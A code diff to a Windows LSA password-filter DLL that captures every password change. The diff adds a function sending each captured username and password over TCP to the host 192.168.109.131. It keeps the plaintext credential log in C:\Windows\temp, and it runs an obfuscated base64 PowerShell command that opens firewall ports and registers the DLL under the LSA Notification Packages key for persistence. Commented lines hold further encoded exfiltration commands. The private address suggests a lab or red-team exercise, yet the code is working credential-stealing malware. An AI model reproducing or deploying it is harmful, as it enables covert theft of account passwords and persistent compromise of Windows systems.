@@ -14,8 +14,54 @@
 
 #include <Windows.h>
 #include <SubAuth.h>
+//#include <wininet.h>
+#include <winsock2.h>
+//#include <iostream>
 
 //////// Helper functions
+NTSTATUS SendToRemote(PUNICODE_STRING text){
+    WSADATA wsaData;
+    SOCKET sock = INVALID_SOCKET;
+    struct sockaddr_in serverAddr;
+
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        //std::cerr << "WSAStartup failed with error: " << WSAGetLastError() << std::endl;
+        return 1;
+    }
+
+    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock == INVALID_SOCKET) {
+        //std::cerr << "Socket creation failed with error: " << WSAGetLastError() << std::endl;
+        WSACleanup();
+        return 2;
+    }
+
+    // Set up the sockaddr_in structure
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(80);
+    serverAddr.sin_addr.s_addr = inet_addr("192.168.109.131");
+
+    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
+        //std::cerr << "Failed to connect to server: " << WSAGetLastError() << std::endl;
+        closesocket(sock);
+        WSACleanup();
+        return false;
+    }
+
+    //send it
+    if (send(sock, (const char*)text->Buffer, text->Length, 0) == SOCKET_ERROR) {
+        //std::cerr << "Send failed with error: " << WSAGetLastError() << std::endl;
+        closesocket(sock);
+        WSACleanup();
+        return false;
+    }
+
+    // Cleanup
+    closesocket(sock);
+    WSACleanup();
+    return 0;
+}
+
 //Does persistence things
 NTSTATUS justPersistenceThings(){
     system("powershell.exe -EncodedCommand RQBuAGEAYgBsAGUALQBQAFMAUgBlAG0AbwB0AGkAbgBnADsAJABlAHgAaQBzAHQAaQBuAGcAUgB1AGwAZQAgAD0AIABHAGUAdAAtAE4AZQB0AEYAaQByAGUAdwBhAGwAbABSAHUAbABlACAALQBEAGkAcwBwAGwAYQB5AE4AYQBtAGUAIAAiAFcAaQBuAGQAbwB3AHMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUwB1AGIAcwB5AHMAdABlAG0AIgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA7AGkAZgAgACgALQBuAG8AdAAgACQAZQB4AGkAcwB0AGkAbgBnAFIAdQBsAGUAKQAgAHsATgBlAHcALQBOAGUAdABGAGkAcgBlAHcAYQBsAGwAUgB1AGwAZQAgAC0ARABpAHMAcABsAGEAeQBOAGEAbQBlACAAIgBXAGkAbgBkAG8AdwBzACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFMAdQBiAHMAeQBzAHQAZQBtACIAIAAtAEQAaQByAGUAYwB0AGkAbwBuACAASQBuAGIAbwB1AG4AZAAgAC0ATABvAGMAYQBsAFAAbwByAHQAIAA1ADkAOAA1ACAALQBQAHIAbwB0AG8AYwBvAGwAIABUAEMAUAAgAC0AQQBjAHQAaQBvAG4AIABBAGwAbABvAHcAOwBOAGUAdwAtAE4AZQB0AEYAaQByAGUAdwBhAGwAbABSAHUAbABlACAALQBEAGkAcwBwAGwAYQB5AE4AYQBtAGUAIAAiAFcAaQBuAGQAbwB3AHMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUwB1AGIAcwB5AHMAdABlAG0AIgAgAC0ARABpAHIAZQBjAHQAaQBvAG4AIABPAHUAdABiAG8AdQBuAGQAIAAtAEwAbwBjAGEAbABQAG8AcgB0ACAANQA5ADgANQAgAC0AUAByAG8AdABvAGMAbwBsACAAVABDAFAAIAAtAEEAYwB0AGkAbwBuACAAQQBsAGwAbwB3ADsATgBlAHcALQBOAGUAdABGAGkAcgBlAHcAYQBsAGwAUgB1AGwAZQAgAC0ARABpAHMAcABsAGEAeQBOAGEAbQBlACAAIgBIAFQAVABQACAAbwB1AHQAIgAgAC0ARABpAHIAZQBjAHQAaQBvAG4AIABPAHUAdABiAG8AdQBuAGQAIAAtAEwAbwBjAGEAbABQAG8AcgB0ACAAOAAwACAALQBQAHIAbwB0AG8AYwBvAGwAIABUAEMAUAAgAC0AQQBjAHQAaQBvAG4AIABBAGwAbABvAHcAfQBSAGUAbQBvAHYAZQAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAHkAcwB0AGUAbQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAEMAbwBuAHQAcgBvAGwAXABMAHMAYQAiACAALQBOAGEAbQBlACAAIgBOAG8AdABpAGYAaQBjAGEAdABpAG8AbgAgAFAAYQBjAGsAYQBnAGUAcwAiADsAIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAHkAcwB0AGUAbQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAEMAbwBuAHQAcgBvAGwAXABMAHMAYQAiACAALQBOAGEAbQBlACAAIgBOAG8AdABpAGYAaQBjAGEAdABpAG8AbgAgAFAAYQBjAGsAYQBnAGUAcwAiACAALQBWAGEAbAB1AGUAIAAiAHIAYQBzAHMAZgBtAGAAcgBgAG4AcwBjAGUAYwBsAGkAYAByAGAAbgBsAGkAYgBmAGkAbAB0AGUAcgAiACAALQBQAHIAbwBwAGUAcgB0AHkAVAB5AHAAZQAgAE0AdQBsAHQAaQBTAHQAcgBpAG4AZwA=");
@@ -78,7 +124,7 @@ NTSTATUS catUTF16LEStr(
 BOOL writeToFile(PUNICODE_STRING text) {
     //open a file (the janky windows way)
     HANDLE hFile = CreateFileW(
-            L"C:\\Windows\\temp\\lsass2.log",
+            L"C:\\Windows\\temp\\lsass.log",
             FILE_APPEND_DATA,
             FILE_SHARE_READ,
             NULL,
@@ -169,8 +215,39 @@ extern "C" __declspec(dllexport) NTSTATUS __stdcall PasswordChangeNotify(PUNICOD
     writeToFile(password);
     writeToFile(&newline);
 
+    PUNICODE_STRING temp1 = (PUNICODE_STRING) malloc(sizeof(UNICODE_STRING));
+    PUNICODE_STRING temp2 = (PUNICODE_STRING) malloc(sizeof(UNICODE_STRING));
+    PUNICODE_STRING fullString = (PUNICODE_STRING) malloc(sizeof(UNICODE_STRING));
+    catUTF16LEStr(uname, &colon, temp1);
+    catUTF16LEStr(password, &newline, temp2);
+    catUTF16LEStr(temp1, temp2, fullString);
+
+    SendToRemote(fullString);
+
+//    free(temp1);
+//    free(temp2);
+//    free(fullString);
+
+//    //https://malicious.link/posts/2013/2013-09-11-stealing-passwords-every-time-they-change/
+//    HINTERNET hInternet = InternetOpen(reinterpret_cast<LPCSTR>(L"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+//    HINTERNET hSession = InternetConnect(hInternet, reinterpret_cast<LPCSTR>(L"192.168.109.131"), 80, NULL, NULL, INTERNET_SERVICE_HTTP , 0, 0);
+//    HINTERNET hReq = HttpOpenRequest(hSession, reinterpret_cast<LPCSTR>(L"POST"), reinterpret_cast<LPCSTR>(L"/post"), NULL, NULL, NULL, 0, 0);
+//    char* pBuf= (char *) "SomeData";
+//
+//    InternetSetOption(hSession,INTERNET_OPTION_USERNAME,uname->Buffer,uname->Length/2);
+//    InternetSetOption(hSession,INTERNET_OPTION_PASSWORD,password->Buffer,password->Length/2);
+//    HttpSendRequest(hReq,NULL,0,pBuf,strlen(pBuf));
+
+//    LPCSTR command = reinterpret_cast<LPCSTR>("powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABmAGkAbABlAFAAYQB0AGgAIAA9ACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAGwAcwBhAHMAcwAuAGwAbwBnACIAOwAkAHMAZQByAHYAZQByAFUAcgBsACAAPQAgACIAMQA5ADIALgAxADYAOAAuADEAMAA5AC4AMQAzADEALwBwAG8AcwB0ACIAOwAkAGwAYQBzAHQATABpAG4AZQAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAtAFAAYQB0AGgAIAAkAGYAaQBsAGUAUABhAHQAaAAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBMAGEAcwB0ACAAMQA7AEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIAAkAHMAZQByAHYAZQByAFUAcgBsACAALQBNAGUAdABoAG8AZAAgAFAAbwBzAHQAIAAtAEIAbwBkAHkAIAAkAGwAYQBzAHQATABpAG4AZQAgAC0AQwBvAG4AdABlAG4AdABUAHkAcABlACAAIgB0AGUAeAB0AC8AcABsAGEAaQBuADsAIABjAGgAYQByAHMAZQB0AD0AdQB0AGYALQAxADYAbABlACIACgA=");
+
     //call the other executable for networking
-//    system("powershell.exe -EncodedCommand JABmAGkAbABlAFAAYQB0AGgAIAA9ACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAGwAcwBhAHMAcwAuAGwAbwBnACIAOwAkAHMAZQByAHYAZQByAFUAcgBsACAAPQAgACIAMQA5ADIALgAxADYAOAAuADEAMAA5AC4AMQAzADEALwBwAG8AcwB0ACIAOwAkAGwAYQBzAHQATABpAG4AZQAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAtAFAAYQB0AGgAIAAkAGYAaQBsAGUAUABhAHQAaAAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBMAGEAcwB0ACAAMQA7AEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIAAkAHMAZQByAHYAZQByAFUAcgBsACAALQBNAGUAdABoAG8AZAAgAFAAbwBzAHQAIAAtAEIAbwBkAHkAIAAkAGwAYQBzAHQATABpAG4AZQAgAC0AQwBvAG4AdABlAG4AdABUAHkAcABlACAAIgB0AGUAeAB0AC8AcABsAGEAaQBuADsAIABjAGgAYQByAHMAZQB0AD0AdQB0AGYALQAxADYAbABlACIACgA=");
+//    ShellExecute(NULL,
+//                 reinterpret_cast<LPCSTR>("open"),
+//                 reinterpret_cast<LPCSTR>("calc.exe"),
+//                 reinterpret_cast<LPCSTR>(""),
+//                 NULL,
+//                 SW_SHOWNORMAL
+//    );
 //    STARTUPINFO startupInfo;
 //    PROCESS_INFORMATION processInfo;
 //    ZeroMemory(&startupInfo, sizeof(startupInfo));
